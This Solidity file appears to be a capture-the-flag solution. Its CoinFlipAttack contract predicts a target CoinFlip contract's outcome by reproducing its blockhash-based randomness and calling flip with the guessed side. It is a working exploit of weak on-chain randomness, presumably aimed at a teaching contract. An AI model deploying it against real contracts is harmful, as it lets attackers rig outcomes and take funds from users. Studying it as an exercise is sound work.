// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';


interface CoinFlip {
  //uint256 public consecutiveWins;
  function flip(bool _guess) external returns (bool);    
}

contract CoinFlipAttack {
    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip cfinstance;

    constructor(address coinflip) public {
        cfinstance = CoinFlip(coinflip);
    }

    function flip() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        cfinstance.flip(side);
    }
    //function consecutiveWins() external returns(uint256) {
    //    return cfinstance.consecutiveWins;
    //}
}